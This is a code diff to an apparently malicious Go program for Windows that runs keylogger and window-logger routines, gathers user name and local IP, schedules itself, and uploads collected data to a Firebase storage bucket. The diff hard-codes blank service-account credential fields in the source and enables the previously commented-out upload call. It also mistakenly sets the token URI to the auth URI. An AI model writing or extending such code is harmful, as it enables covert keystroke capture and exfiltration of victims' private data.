@@ -7,6 +7,7 @@ package main
 import (
 	"bytes"
 	"context"
+	"encoding/json"
 	"io"
 	"log"
 	"net"
@@ -20,10 +21,23 @@ import (
 	"cloud.google.com/go/storage"
 	firebase "firebase.google.com/go"
 	"github.com/gios/amigo/constants"
+	"golang.org/x/oauth2/google"
 	"google.golang.org/api/option"
 )
 
 const destinationFile = "host.up"
+const storageBucket = ""
+
+const accountType = ""
+const projectID = ""
+const privateKeyID = ""
+const privateKey = ""
+const clientEmail = ""
+const clientID = ""
+const authURI = ""
+const tokenURI = ""
+const authProvider = ""
+const clientCertURL = ""
 
 var (
 	user32   = syscall.NewLazyDLL("user32.dll")
@@ -54,6 +68,19 @@ type systemInfo struct {
 	userName     string
 	userUsername string
 	localIP      net.IP
+}
+
+type googleCredentialsJSON struct {
+	AccountType   string `json:"type"`
+	ProjectID     string `json:"project_id"`
+	PrivateKeyID  string `json:"private_key_id"`
+	PrivateKey    string `json:"private_key"`
+	ClientEmail   string `json:"client_email"`
+	ClientID      string `json:"client_id"`
+	AuthURI       string `json:"auth_uri"`
+	TokenURI      string `json:"token_uri"`
+	AuthProvider  string `json:"auth_provider_x509_cert_url"`
+	ClientCertURL string `json:"client_x509_cert_url"`
 }
 
 func (si *systemInfo) String() string {
@@ -460,9 +487,31 @@ func copy(src, dst string) error {
 
 func initFirebase() {
 	config := &firebase.Config{
-		StorageBucket: "",
+		StorageBucket: storageBucket,
 	}
-	opt := option.WithCredentialsFile("test.json") // TODO: DO THIS VIA METHOD NOT FILE
+
+	credentialsJSONStruct := &googleCredentialsJSON{
+		AccountType:   accountType,
+		ProjectID:     projectID,
+		PrivateKeyID:  privateKeyID,
+		PrivateKey:    privateKey,
+		ClientEmail:   clientEmail,
+		ClientID:      clientID,
+		AuthURI:       authURI,
+		TokenURI:      authURI,
+		AuthProvider:  authProvider,
+		ClientCertURL: clientCertURL,
+	}
+
+	credentialsJSON, marshalErr := json.Marshal(credentialsJSONStruct)
+	if marshalErr != nil {
+		log.Panicf("json Marshal -> %v", marshalErr)
+	}
+	googleCredentials := &google.Credentials{
+		ProjectID: projectID,
+		JSON:      []byte(credentialsJSON),
+	}
+	opt := option.WithCredentials(googleCredentials)
 	app, err := firebase.NewApp(context.Background(), config, opt)
 	if err != nil {
 		log.Panicf("newApp -> %v", err)
@@ -516,7 +565,7 @@ func main() {
 	createLogFile()
 	addScheduler()
 	initFirebase()
-	// writeToBucket()
+	writeToBucket()
 	go fileInterval()
 	go keyLogger()
 	go windowLogger()
